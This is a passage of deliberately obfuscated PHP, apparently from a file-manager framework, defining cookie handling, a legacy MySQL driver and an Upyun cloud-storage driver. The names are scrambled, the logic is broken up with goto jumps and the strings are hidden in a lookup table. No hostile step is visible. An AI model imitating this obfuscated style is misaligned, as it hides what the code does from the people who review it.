$_SERVER[$C×½ÖÙ¢ÚÍ[816]] . $C×½ÖÙ¢ÚÍ[817]; goto bºÄ¥Öš‘¬; Eà®Ó·ŸÇ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $A„‹ÓØÃÍ¨) { $this->handle->flushall($A„‹ÓØÃÍ¨); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($DòÚô‡Üù© = '', $f×š•ö‘Ø = 0) { if (is_string($DòÚô‡Üù©) && $DòÚô‡Üù© != $_SERVER[Æ¼ôºÙï][33]) { $this->prefix = $DòÚô‡Üù©; } if (is_numeric($f×š•ö‘Ø) && $f×š•ö‘Ø > 0) { $this->expire = $f×š•ö‘Ø; } } public static function getInstance() { static $B¤» ŒÄ÷˜; if ($B¤» ŒÄ÷˜ === null) { $B¤» ŒÄ÷˜ = new self(); } return $B¤» ŒÄ÷˜; } private static $cookieDisable = false; public static function disable($cĞÚ’ÖÜ¤) { self::$cookieDisable = $cĞÚ’ÖÜ¤; } private static $sameCookieSet = array(); public static function set($A†Æ¿µÔô, $a‰†Ûªê²­, $e¼®á° áÛ = 0, $EÄ†éËæŞÆ = false, $Eèº›ö•™¥ = false) { goto AÊ³ç»Å²Ì; AÊ³ç»Å²Ì: $d”ó™­¢„ =& $_SERVER[Æ¼ôºÙï]; if (self::$cookieDisable) { return; } if (!$e¼®á° áÛ) { $e¼®á° áÛ = 24 * 3600 * 7; } goto AìÖ²œß¤; b±êåõŞ¶Ì: $Dñ¡µßŸ¼© = $d”ó™­¢„[33]; setcookie($A†Æ¿µÔô, $a‰†Ûªê²­, time() + $e¼®á° áÛ, $d”ó™­¢„[8] . trim($Eèº›ö•™¥, $d”ó™­¢„[8]) . $Dñ¡µßŸ¼©, !1, !1, $EÄ†éËæŞÆ); goto b”É¢Ì÷‡Ù; AìÖ²œß¤: if (isset(self::$sameCookieSet[$A†Æ¿µÔô]) && self::$sameCookieSet[$A†Æ¿µÔô] == $a‰†Ûªê²­ . $e¼®á° áÛ) { return; } self::$sameCookieSet[$A†Æ¿µÔô] = $a‰†Ûªê²­ . $e¼®á° áÛ; if (!$Eèº›ö•™¥) { $Eèº›ö•™¥ = str_replace(HOST, $d”ó™­¢„[33], APP_HOST); $Eèº›ö•™¥ = _get($GLOBALS, $d”ó™­¢„[823], $Eèº›ö•™¥); } goto b±êåõŞ¶Ì; b”É¢Ì÷‡Ù: } public static function setSafe($bÍò’‘°ºˆ, $dÉ»‚—À´ò, $EÚŠÉ«”Ç• = 0) { self::set($bÍò’‘°ºˆ, $dÉ»‚—À´ò, $EÚŠÉ«”Ç•, !0); } public static function get($DÔ»¤ îğÛ) { return isset($_COOKIE[$DÔ»¤ îğÛ]) ? $_COOKIE[$DÔ»¤ îğÛ] : !1; } public static function remove($EëïöâÑ«, $fšƒ¾†ôå¼ = false) { unset($_COOKIE[$EëïöâÑ«]); self::set($EëïöâÑ«, $_SERVER[Æ¼ôºÙï][33], 1, $fšƒ¾†ôå¼); } } class DbMysql extends Db { public function __construct($f™¯öŞ†áÄ = '') { $dĞÈ›³‚Ğª =& $_SERVER[Æ¼ôºÙï]; if (!extension_loaded($dĞÈ›³‚Ğª[746])) { think_exception(think_lang($dĞÈ›³‚Ğª[10]) . $dĞÈ›³‚Ğª[824]); } if (!empty($f™¯öŞ†áÄ)) { $this->config = $f™¯öŞ†áÄ; if (empty($this->config[$dĞÈ›³‚Ğª[13]])) { $this->config[$dĞÈ›³‚Ğª[13]] = $dĞÈ›³‚Ğª[33]; } } } public function connect($cùŸ‚Ò²õŠ = '', $E“ˆÊá¢… = 0, $bØ·³‘Ë„Å = false) { $F¼æ“å¦ë =& $_SERVER[Æ¼ôºÙï]; if (!isset($this->linkID[$E“ˆÊá¢…])) { goto fé°£‰á; fé°£‰á: if (empty($cùŸ‚Ò²õŠ)) { $cùŸ‚Ò²õŠ = $this->config; } $Có±õêã¢ = $cùŸ‚Ò²õŠ[$F¼æ“å¦ë[825]] . ($cùŸ‚Ò²õŠ[$F¼æ“å¦ë[826]] ? "\x3a{$cùŸ‚Ò²õŠ[$F¼æ“å¦ë[826]]}" : $F¼æ“å¦ë[33]); $C’‹•ã˜Î = !empty($cùŸ‚Ò²õŠ[$F¼æ“å¦ë[13]][$F¼æ“å¦ë[14]]) ? $cùŸ‚Ò²õŠ[$F¼æ“å¦ë[13]][$F¼æ“å¦ë[14]] : $this->pconnect; goto F¡ŒŸœ™Ã; F¡ŒŸœ™Ã: if ($C’‹•ã˜Î) { $this->linkID[$E“ˆÊá¢…] = mysql_pconnect($Có±õêã¢, $cùŸ‚Ò²õŠ[$F¼æ“å¦ë[827]], $cùŸ‚Ò²õŠ[$F¼æ“å¦ë[828]], 131072); } else { $this->linkID[$E“ˆÊá¢…] = mysql_connect($Có±õêã¢, $cùŸ‚Ò²õŠ[$F¼æ“å¦ë[827]], $cùŸ‚Ò²õŠ[$F¼æ“å¦ë[828]], !0, 131072); } if (!$this->linkID[$E“ˆÊá¢…] || !empty($cùŸ‚Ò²õŠ[$F¼æ“å¦ë[17]]) && !mysql_select_db($cùŸ‚Ò²õŠ[$F¼æ“å¦ë[17]], $this->linkID[$E“ˆÊá¢…])) { think_exception(mysql_error()); } $a†±Åà¢ = mysql_get_server_info($this->linkID[$E“ˆÊá¢…]); goto a©¾ŒÑƒÌê; a©¾ŒÑƒÌê: mysql_query($F¼æ“å¦ë[829] . think_config($F¼æ“å¦ë[830]) . $F¼æ“å¦ë[55], $this->linkID[$E“ˆÊá¢…]); if ($a†±Åà¢ > $F¼æ“å¦ë[831]) { mysql_query($F¼æ“å¦ë[832], $this->linkID[$E“ˆÊá¢…]); } $this->connected = !0; goto A„„¹ÇİÈç; A„„¹ÇİÈç: if (1 != think_config($F¼æ“å¦ë[18])) { unset($this->config); } goto dˆ‹Âø™ã†; dˆ‹Âø™ã†: } return $this->linkID[$E“ˆÊá¢…]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($b×ëõã´Ú) { goto bÃ„¸»×ˆó; fî¯œà¸ä²: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto A… ÉÖÛ½ß; eƒ±ñŒ«Ê: if (!$this->_linkID) { return !1; } $this->queryStr = $b×ëõã´Ú; if ($this->queryID) { $this->free(); } goto dÓ„ß…¢„¬; bÃ„¸»×ˆó: $c¤öÖ”¾‰´ =& $_SERVER[Æ¼ôºÙï]; if (0 === stripos($b×ëõã´Ú, $c¤öÖ”¾‰´[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto eƒ±ñŒ«Ê; dÓ„ß…¢„¬: think_action_status($c¤öÖ”¾‰´[19], 1); think_status($c¤öÖ”¾‰´[20]); $this->queryID = mysql_query($b×ëõã´Ú, $this->_linkID); goto fî¯œà¸ä²; A… ÉÖÛ½ß: } public function execute($c¦áÌæÉğš) { goto Eœ†˜×†îÒ; fåßÊë«È®: if (!1 === $fÆŞ‘¢Ğ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto a›ÆÏÉ¬Ì; FÉ’œŒÍ‰ã: think_status($C²”Šõ¯Š[20]); $fÆŞ‘¢Ğ = mysql_query($c¦áÌæÉğš, $this->_linkID); $this->debug(); goto fåßÊë«È®; AØ™ÕÇ¢Ø’: $this->queryStr = $c¦áÌæÉğš; if ($this->queryID) { $this->free(); } think_action_status($C²”Šõ¯Š[21], 1); goto FÉ’œŒÍ‰ã; Eœ†˜×†îÒ: $C²”Šõ¯Š =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AØ™ÕÇ¢Ø’; a›ÆÏÉ¬Ì: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Æ¼ôºÙï][833], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b‡¨æ–²Œ = mysql_query($_SERVER[Æ¼ôºÙï][834], $this->_linkID); $this->transTimes = 0; if (!$b‡¨æ–²Œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a÷ñÉè¥´† = mysql_query($_SERVER[Æ¼ôºÙï][835], $this->_linkID); $this->transTimes = 0; if (!$a÷ñÉè¥´†) { $this->error(); return !1; } } return !0; } private function getAll() { $aÑÅ×ãóæÛ = array(); if ($this->numRows > 0) { while ($a¿ˆÕ±³¾ = mysql_fetch_assoc($this->queryID)) { $aÑÅ×ãóæÛ[] = $a¿ˆÕ±³¾; } mysql_data_seek($this->queryID, 0); } return $aÑÅ×ãóæÛ; } public function getFields($bÆæÌÉÑÍ) { $C‘î÷“œ¤å =& $_SERVER[Æ¼ôºÙï]; $EŸõ» ñÊè = $this->query($C‘î÷“œ¤å[836] . $this->parseKey($bÆæÌÉÑÍ)); $E›¿ã‡Ôíƒ = array(); if ($EŸõ» ñÊè) { foreach ($EŸõ» ñÊè as $D•á‘í‡Üï => $cß±¦ÄÅƒä) { $E›¿ã‡Ôíƒ[$cß±¦ÄÅƒä[$C‘î÷“œ¤å[27]]] = array($C‘î÷“œ¤å[28] => $cß±¦ÄÅƒä[$C‘î÷“œ¤å[27]], $C‘î÷“œ¤å[29] => $cß±¦ÄÅƒä[$C‘î÷“œ¤å[30]], $C‘î÷“œ¤å[31] => (bool) (strtoupper($cß±¦ÄÅƒä[$C‘î÷“œ¤å[32]]) === $C‘î÷“œ¤å[837]), $C‘î÷“œ¤å[34] => $cß±¦ÄÅƒä[$C‘î÷“œ¤å[35]], $C‘î÷“œ¤å[36] => strtolower($cß±¦ÄÅƒä[$C‘î÷“œ¤å[37]]) == $C‘î÷“œ¤å[38], $C‘î÷“œ¤å[39] => strtolower($cß±¦ÄÅƒä[$C‘î÷“œ¤å[40]]) == $C‘î÷“œ¤å[41]); } } return $E›¿ã‡Ôíƒ; } public function getTables($EÍÜ®ÖÎŒ = '') { $E¦Ó·ÈäÃ =& $_SERVER[Æ¼ôºÙï]; if (!empty($EÍÜ®ÖÎŒ)) { $B‚ŸÀ¤í¤ = $E¦Ó·ÈäÃ[838] . $EÍÜ®ÖÎŒ . $E¦Ó·ÈäÃ[839]; } else { $B‚ŸÀ¤í¤ = $E¦Ó·ÈäÃ[840]; } $cÕïËÆ‘°‹ = $this->query($B‚ŸÀ¤í¤); $AÓ—­‡Ñ¬ = array(); foreach ($cÕïËÆ‘°‹ as $Eùâ’ÔäÏ => $cÅæ° ¼À) { $AÓ—­‡Ñ¬[$Eùâ’ÔäÏ] = current($cÅæ° ¼À); } return $AÓ—­‡Ñ¬; } public function replace($cáŸô‘Ø , $e›†äÛãƒ¨ = array()) { $E‹²Ÿôƒšã =& $_SERVER[Æ¼ôºÙï]; foreach ($cáŸô‘Ø  as $F‘©†ÀïÂ‹ => $aÛÄ¥Œ´âÕ) { $cŸ“³àæö = $this->parseValue($aÛÄ¥Œ´âÕ); if (is_scalar($cŸ“³àæö)) { $b²™ïˆç¸Û[] = $cŸ“³àæö; $e§¾„µ·¡[] = $this->parseKey($F‘©†ÀïÂ‹); } } $bİÔÕõ§Éî = $E‹²Ÿôƒšã[841] . $this->parseTable($e›†äÛãƒ¨[$E‹²Ÿôƒšã[275]]) . $E‹²Ÿôƒšã[842] . implode($E‹²Ÿôƒšã[47], $e§¾„µ·¡) . $E‹²Ÿôƒšã[843] . implode($E‹²Ÿôƒšã[47], $b²™ïˆç¸Û) . $E‹²Ÿôƒšã[844]; return $this->execute($bİÔÕõ§Éî); } public function insertAll($a¤ŠŠ“ŒŞ„, $bË±ª×ÁµÏ = array(), $EŠ½¼ŒäŠÄ = false) { goto A¿¾Ñí’ó³; A¿¾Ñí’ó³: $F¥îÚ¼©÷ =& $_SERVER[Æ¼ôºÙï]; if (!is_array($a¤ŠŠ“ŒŞ„[0])) { return !1; } $eÃ¥¸Ùˆ„¥ = array_keys($a¤ŠŠ“ŒŞ„[0]); goto bÑÖ·‡ø‘; bÑÖ·‡ø‘: $bÊº‰¼…‹ê = array(); foreach ($a¤ŠŠ“ŒŞ„ as $B‹Äì¢á–¸) { $bĞÔìÂ‰Îá = array(); foreach ($B‹Äì¢á–¸ as $bÊšã’ÒÓ => $AÎµº×Ï¸) { $AÎµº×Ï¸ = $this->parseValue($AÎµº×Ï¸); if (is_scalar($AÎµº×Ï¸)) { $bĞÔìÂ‰Îá[] = $AÎµº×Ï¸; } } $bÊº‰¼…‹ê[] = $F¥îÚ¼©÷[256] . implode($F¥îÚ¼©÷[47], $bĞÔìÂ‰Îá) . $F¥îÚ¼©÷[844]; } array_walk($eÃ¥¸Ùˆ„¥, array($this, $F¥îÚ¼©÷[845])); goto CÌÉ êÃ; CÌÉ êÃ: $C²‚ì¬ìó± = ($EŠ½¼ŒäŠÄ ? $F¥îÚ¼©÷[846] : $F¥îÚ¼©÷[847]) . $F¥îÚ¼©÷[848] . $this->parseTable($bË±ª×ÁµÏ[$F¥îÚ¼©÷[275]]) . $F¥îÚ¼©÷[842] . implode($F¥îÚ¼©÷[47], $eÃ¥¸Ùˆ„¥) . $F¥îÚ¼©÷[849] . implode($F¥îÚ¼©÷[47], $bÊº‰¼…‹ê); return $this->execute($C²‚ì¬ìó±); goto d”Î©Î‹ÆÉ; d”Î©Î‹ÆÉ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $a‚òĞ›è‡ =& $_SERVER[Æ¼ôºÙï]; $this->error = mysql_errno() . $a‚òĞ›è‡[4] . mysql_error($this->_linkID); if ($a‚òĞ›è‡[33] != $this->queryStr) { $this->error .= LNG($a‚òĞ›è‡[45]) . $this->queryStr; } think_trace($this->error, $a‚òĞ›è‡[33], $a‚òĞ›è‡[46]); return $this->error; } public function escapeString($dàñÌÄˆ) { if ($this->_linkID) { return mysql_real_escape_string($dàñÌÄˆ, $this->_linkID); } else { return mysql_escape_string($dàñÌÄˆ); } } public function parseKey(&$fº£œåè°Û, $E´´ ¡££Ö = true) { $EÌ¢êŞØïì =& $_SERVER[Æ¼ôºÙï]; if ($E´´ ¡££Ö) { $fº£œåè°Û = $this->parseKeyCheck($fº£œåè°Û); } if ($fº£œåè°Û != $EÌ¢êŞØïì[182] && !preg_match($EÌ¢êŞØïì[850], $fº£œåè°Û)) { $fº£œåè°Û = $EÌ¢êŞØïì[377] . trim($fº£œåè°Û, $EÌ¢êŞØïì[377]) . $EÌ¢êŞØïì[377]; } return $fº£œåè°Û; } } goto aôÅ¢‹à™; Fëö½±²¹: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($c´øğ¸îòÀ, $cºø÷á‰²Ã = 0) { parent::__construct(); $this->source = $c´øğ¸îòÀ; $this->sourceSize = $cºø÷á‰²Ã; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($d²¢ó‹é—Ö = false) { return $this->sourceSize; } public function getContent($CåÉ¯Ç«„† = false) { return $this->fileSubstr($CåÉ¯Ç«„†, 0, $this->sourceSize); } public function fileSubstr($b›Ü¾ŠÄÎ = false, $eåïà¥‚½ = 0, $bôâŒó”•× = 0) { if (!$bôâŒó”•×) { $bôâŒó”•× = $this->sourceSize; } $Cµ‹·ŒÓŠ¥ = $this->sourceSize - $eåïà¥‚½; if ($bôâŒó”•× >= $Cµ‹·ŒÓŠ¥) { $bôâŒó”•× = $Cµ‹·ŒÓŠ¥; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $eåïà¥‚½, $bôâŒó”•×); } if ($this->sourceType == self::TYPE_FILE) { if ($bôâŒó”•× <= 0) { return $_SERVER[Æ¼ôºÙï][33]; } $CÙÔ•º‰Ğ© = ftell($this->source); fseek_64($this->source, $CÙÔ•º‰Ğ© + $eåïà¥‚½); $F¼¥†àÏÇ® = @fread($this->source, $bôâŒó”•×); fseek_64($this->source, $CÙÔ•º‰Ğ©); return $F¼¥†àÏÇ®; } } public function hashMd5($cØ¦¦Ú¡… = false) { return md5($this->getContent()); } public static function hash($c¢‡¹±é˜İ, $aŞ´»‡‰¾² = 0) { $e¿“‡ÊÆˆ  = new PathDriverStream($c¢‡¹±é˜İ, $aŞ´»‡‰¾²); return $e¿“‡ÊÆˆ ->hashSimple($c¢‡¹±é˜İ); } public static function md5($AÎÛáÌ¯«Ë, $cÈ•…îÑ = 0) { $aƒ¦â³íÍ = new PathDriverStream($AÎÛáÌ¯«Ë, $cÈ•…îÑ); return $aƒ¦â³íÍ->hashMd5($AÎÛáÌ¯«Ë); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\x3a\x2f\57\166\x30\x2e\x61\160\151\x2e\x75\x70\x79\165\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($D‚›ô·…¡) { parent::__construct(); $this->_init($D‚›ô·…¡); } public function _init($aâÃÅ¿ƒÈÇ) { $D²ÍÕòİÌ¼ =& $_SERVER[Æ¼ôºÙï]; foreach ($aâÃÅ¿ƒÈÇ as $aÃùÎîĞ« => $CÅ®¶¡ìÚ) { if (isset($this->{$aÃùÎîĞ«})) { $this->{$aÃùÎîĞ«} = $CÅ®¶¡ìÚ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($D²ÍÕòİÌ¼[1305] . LNG($D²ÍÕòİÌ¼[1237])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($D·¼‘ƒÛĞŠ, $d‘ÉŒÙª§æ = "\x47\105\x54") { $F‘­¯Í„ =& $_SERVER[Æ¼ôºÙï]; $Fï²Û»µ›½ = gmdate($F‘­¯Í„[1271]); $aÛŸË·ŠÌ§ = base64_encode(hash_hmac($F‘­¯Í„[1306], "{$d‘ÉŒÙª§æ}\46{$D·¼‘ƒÛĞŠ}\x26{$Fï²Û»µ›½}", md5("{$this->userpass}"), !0)); $A¾²Ç¤–ó† = array("\101\165\164\x68\157\x72\151\x7a\x61\x74\x69\x6f\156\x3a\x55\120\x59\x55\x4e\x20{$this->username}\x3a{$aÛŸË·ŠÌ§}", "\104\141\x74\145\72{$Fï²Û»µ›½}"); return $A¾²Ç¤–ó†; } public function ussRequest($dÃò©¶¾Ğ, $aã…ŒêÉÚê = "\x47\x45\124", $fØŒ÷¤†Ú¹ = false, $cöŸñ«Å¨Ó = false, $BŞÑ§´Ãó¹ = false) { goto E×Ü¯Š¢Œ×; E×Ü¯Š¢Œ×: $DàÈ’Øì² =& $_SERVER[Æ¼ôºÙï]; $dÃò©¶¾Ğ = trim($dÃò©¶¾Ğ, $DàÈ’Øì²[8]); $A“Ğ˜Ô‰Š = "\57{$this->bucket}\57{$dÃò©¶¾Ğ}"; goto e¤¦³ôÆè‡; B¯…İ¨†ğ: if (!$eÌ¨åò›İó) { return array($DàÈ’Øì²[1065] => !1, $DàÈ’Øì²[1067] => $DàÈ’Øì²[1307]); } if (strtolower($aã…ŒêÉÚê) == $DàÈ’Øì²[190] || in_array($eÌ¨åò›İó[$DàÈ’Øì²[1065]], array($DàÈ’Øì²[1165], $DàÈ’Øì²[1308]))) { $fØŒ÷¤†Ú¹ = $eÌ¨åò›İó[$DàÈ’Øì²[1309]]; } else { $fØŒ÷¤†Ú¹ = json_decode($eÌ¨åò›İó[$DàÈ’Øì²[1067]], !0); if (!$fØŒ÷¤†Ú¹) { $fØŒ÷¤†Ú¹ = $eÌ¨åò›İó[$DàÈ’Øì²[1067]]; } else { if (!$eÌ¨åò›İó[$DàÈ’Øì²[708]] && isset($fØŒ÷¤†Ú¹[$DàÈ’Øì²[1310]])) { $fØŒ÷¤†Ú¹ = $fØŒ÷¤†Ú¹[$DàÈ’Øì²[1310]]; } } } return array($DàÈ’Øì²[1065] => $eÌ¨åò›İó[$DàÈ’Øì²[708]], $DàÈ’Øì²[1067] => $fØŒ÷¤†Ú¹); goto f©®ˆ‰ƒ»; e¤¦³ôÆè‡: $AÉ¸î¼¯Õ = $this->ussHeaders($A“Ğ˜Ô‰Š, $aã…ŒêÉÚê); if ($cöŸñ«Å¨Ó) { $AÉ¸î¼¯Õ = array_merge($AÉ¸î¼¯Õ, $cöŸñ«Å¨Ó); } $eÌ¨åò›İó = url_request($this->endpoint . $A“Ğ˜Ô‰Š, $aã…ŒêÉÚê, $fØŒ÷¤†Ú¹, $AÉ¸î¼¯Õ, $BŞÑ§´Ãó¹); goto B¯…İ¨†ğ; f©®ˆ‰ƒ»: } public function mkfile($FÍåœÁœÏ, $B’îÁŠïÒ± = '', $C¤Ö×ù‚ = REPEAT_RENAME) { if ($this->setContent($FÍåœÁœÏ, $B’îÁŠïÒ±)) { return $this->getPathOuter($FÍåœÁœÏ); } return !1; } public function mkdir($dõÖ•™†ä, $E¦§Ûœ•Ğ¢ = REPEAT_SKIP) { $Fèá–¨¡‹  =& $_SERVER[Æ¼ôºÙï]; $bƒ×µÕÇŠ = trim($dõÖ•™†ä, $Fèá–¨¡‹ [8]); if ($this->_isFolder($bƒ×µÕÇŠ)) { return $this->getPathOuter($bƒ×µÕÇŠ); } $B³‘‚Šİë = array($Fèá–¨¡‹ [1311]); $EìøŒßÃ‹£ = $this->ussRequest($bƒ×µÕÇŠ, $Fèá–¨¡‹ [222], !1, $B³‘‚Šİë); return $EìøŒßÃ‹£[$Fèá–¨¡‹ [1065]] ? $this->getPathOuter($bƒ×µÕÇŠ) : !1; } public function copyFile($cğÎ…¤ßÃ¬, $e¿Óåªó¡) { $BñÓĞÈÒŠ =& $_SERVER[Æ¼ôºÙï]; $føíÅŒ§Ã = array($BñÓĞÈÒŠ[1312] . "\x2f{$this->bucket}\x2f{$cğÎ…¤ßÃ¬}", $BñÓĞÈÒŠ[1313]); $A„­„‚¶…Ã = $this->ussRequest($e¿Óåªó¡, $BñÓĞÈÒŠ[224], !1, $føíÅŒ§Ã); return $A„­„‚¶…Ã[$BñÓĞÈÒŠ[1065]] ? !0 : $this->getPathOuter($e¿Óåªó¡); } public function moveFile($A›™²«´®”, $AÉçâÊØà) { $A¨ÑÏá†ªÖ =& $_SERVER[Æ¼ôºÙï]; $E´“‘‰ØÊ÷ = array($A¨ÑÏá†ªÖ[1314] . "\57{$this->bucket}\57{$A›™²«´®”}", $A¨ÑÏá†ªÖ[1313]); $a¹ÍÆ Ë¸á = $this->ussRequest($AÉçâÊØà, $A¨ÑÏá†ªÖ[224], !1, $E´“‘‰ØÊ÷); return $a¹ÍÆ Ë¸á[$A¨ÑÏá†ªÖ[1065]] ? !0 : $this->getPathOuter($AÉçâÊØà); } public function delFile($D÷‘ìí‡) { $EŠ¸²ÛğñÍ =& $_SERVER[Æ¼ôºÙï]; $bÀ•Ü´Ş„ = $this->ussRequest($D÷‘ìí‡, $EŠ¸²ÛğñÍ[1315]); return $bÀ•Ü´Ş„[$EŠ¸²ÛğñÍ[1065]] ? !0 : !1; } public function delFolder($Bª²×¢¹¬İ) { goto fÏá†ê³á½; fí©Á¹Æ‚‰: return $BÉÜ¢ôñ”±[$Eƒî„–ößì[1065]]; goto CÌË¢Ø„; A‘Á¿Éƒ…: foreach ($aì¡¥ŠØôà as $c³º‚Ú…æ) { $BÉÜ¢ôñ”± = $this->ussRequest($c³º‚Ú…æ[$Eƒî„–ößì[28]], $Eƒî„–ößì[1315]); if (!$BÉÜ¢ôñ”±[$Eƒî„–ößì[1065]]) { return !1; } } foreach ($a‚ä±®ÁŸÍ as $cŠ”²öÅÌÙ) { $BÉÜ¢ôñ”± = $this->ussRequest($cŠ”²öÅÌÙ, $Eƒî„–ößì[1315]); if (!$BÉÜ¢ôñ”±[$Eƒî„–ößì[1065]]) { return !1; } } $BÉÜ¢ôñ”± = $this->ussRequest($Bª²×¢¹¬İ, $Eƒî„–ößì[1315]); goto fí©Á¹Æ‚‰; E°ÒÊº·¡: $a‚ä±®ÁŸÍ = $aì¡¥ŠØôà = array(); $this->fileList($Bª²×¢¹¬İ, $a‚ä±®ÁŸÍ, $aì¡¥ŠØôà, !0); $this->listItemCache = !0; goto A‘Á¿Éƒ…; fÏá†ê³á½: $Eƒî„–ößì =& $_SERVER[Æ¼ôºÙï]; if (!$this->exist($Bª²×¢¹¬İ)) { return !0; } $this->listItemCache = !1; goto E°ÒÊº·¡; CÌË¢Ø„: } public function rename($DÄ¿Ä«Ä”’, $FÆêå½ÁÑ–) { if ($this->isFile($DÄ¿Ä«Ä”’)) { $FÆêå½ÁÑ– = get_path_father($DÄ¿Ä«Ä”’) . $FÆêå½ÁÑ–; return $this->moveFile($DÄ¿Ä«Ä”’, $FÆêå½ÁÑ–); } return $this->renameObject($DÄ¿Ä«Ä”’, $FÆêå½ÁÑ–); } public function fileInfo($A²‚´È§”, $Dàïî·İ˜ = false, $D¸çÖĞ‚‰´ = array()) { goto f•ò‹×‰óá; Fïá„: $bÛ…¥ªãŠ…[$E‹Ššè•[192]] = intval($D¸çÖĞ‚‰´[$E‹Ššè•[1316]]); $bÛ…¥ªãŠ…[$E‹Ššè•[83]] = intval($D¸çÖĞ‚‰´[$E‹Ššè•[1317]]); $bÛ…¥ªãŠ…[$E‹Ššè•[77]] = $D¸çÖĞ‚‰´[$E‹Ššè•[77]]; goto dğç¥ÖĞ§Î; f•ò‹×‰óá: $E‹Ššè• =& $_SERVER[Æ¼ôºÙï]; $bÛ…¥ªãŠ… = array($E‹Ššè•[28] => $this->pathThis($A²‚´È§”), $E‹Ššè•[75] => $this->getPathOuter($E‹Ššè•[8] . $A²‚´È§”), $E‹Ššè•[29] => $E‹Ššè•[173], $E‹Ššè•[77] => isset($D¸çÖĞ‚‰´[$E‹Ššè•[77]]) ? $D¸çÖĞ‚‰´[$E‹Ššè•[77]] : 0, $E‹Ššè•[167] => $this->ext($A²‚´È§”)); if ($Dàïî·İ˜) { return $bÛ…¥ªãŠ…; } goto FÙÂ×‰²®Â; FÙÂ×‰²®Â: $bÛ…¥ªãŠ…[$E‹Ššè•[192]] = $bÛ…¥ªãŠ…[$E‹Ššè•[83]] = 0; $bÛ…¥ªãŠ…[$E‹Ššè•[193]] = $bÛ…¥ªãŠ…[$E‹Ššè•[194]] = !0; if (empty($D¸çÖĞ‚‰´)) { $D¸çÖĞ‚‰´ = $this->objectMeta($A²‚´È§”); if (!$D¸çÖĞ‚‰´) { return $bÛ…¥ªãŠ…; } } goto Fïá„; dğç¥ÖĞ§Î: return $bÛ…¥ªãŠ…; goto cÚº¦Õ•ì; cÚº¦Õ•ì: } public function folderInfo($cà„•è•«†, $CÜ§Ü«‡ó = false) { goto B»Âèò®ò ; B‚—İ£‘è: $e‰‡Šƒ¢ìÄ[$F‡ØÄÑÓ†…[192]] = $e‰‡Šƒ¢ìÄ[$F‡ØÄÑÓ†…[83]] = 0; $e‰‡Šƒ¢ìÄ[$F‡ØÄÑÓ†…[193]] = $e‰‡Šƒ¢ìÄ[$F‡ØÄÑÓ†…[194]] = !0; if (empty($e‡¿…ºö¹)) { $e‡¿…ºö¹ = $this->objectMeta($cà„•è•«†); if (!$e‡¿…ºö¹) { return $e‰‡Šƒ¢ìÄ; } } goto BÉÖÀäôñ²; B»Âèò®ò : $F‡ØÄÑÓ†… =& $_SERVER[Æ¼ôºÙï]; $e‰‡Šƒ¢ìÄ = array($F‡ØÄÑÓ†…[28] => $this->pathThis($cà„•è•«†), $F‡ØÄÑÓ†…[75] => $this->getPathOuter($F‡ØÄÑÓ†…[8] . $cà„•è•«†), $F‡ØÄÑÓ†…[29] => $F‡ØÄÑÓ†…[76]); if ($CÜ§Ü«‡ó) { return $e‰‡Šƒ¢ìÄ; } goto B‚—İ£‘è; BÉÖÀäôñ²: $e‰‡Šƒ¢ìÄ[$F‡ØÄÑÓ†…[192]] = intval($e‡¿…ºö¹[$F‡ØÄÑÓ†…[1316]]); $e‰‡Šƒ¢ìÄ[$F‡ØÄÑÓ†…[83]] = intval($e‡¿…ºö¹[$F‡ØÄÑÓ†…[1317]]); return $e‰‡Šƒ¢ìÄ; goto C¥³ßÇ–Ç¥; C¥³ßÇ–Ç¥: } private function listObjs($b•À¿Ë§¬‡, $A·§¤Ã­¾÷ = 0, $eöÅÜá±ïÉ = 1000) { $C«ñíââ‹ =& $_SERVER[Æ¼ôºÙï]; $Fª‰Â™³´ = array($C«ñíââ‹[1318], $C«ñíââ‹[1319] . $eöÅÜá±ïÉ); if ($A·§¤Ã­¾÷) { $Fª‰Â™³´[] = $C«ñíââ‹[1320] . $A·§¤Ã­¾÷; } $bª³ËÙ¢ë = $this->ussRequest($b•À¿Ë§¬‡, $C«ñíââ‹[226], !1, $Fª‰Â™³´); return !$bª³ËÙ¢ë[$C«ñíââ‹[1065]] ? !1 : $bª³ËÙ¢ë[$C«ñíââ‹[1067]]; } private function fileList($dÔ‡öÀôŸ, &$DäËÇ®Ì¼, &$DÛ“Ğê‘£ , $d¯Ä…”Ó°î = false) { goto eùÂ¹•šìä; eùÂ¹•šìä: $fŸ†Š¯Ó‡† =& $_SERVER[Æ¼ôºÙï]; $CÒšÔ³è³ = $fŸ†Š¯Ó‡†[33]; $AÌÍÆÒï “ = 1000; goto dìÊ†‹˜Ş; aÕ‚Ä­¡: if ($d†ºä¬‰„) { $this->cacheMethod($fŸ†Š¯Ó‡†[197], $dÔ‡öÀôŸ, !0); } goto B˜¬æ˜Ö´¬; dìÊ†‹˜Ş: $F‘èÏ¡©¹± = rtrim($dÔ‡öÀôŸ, 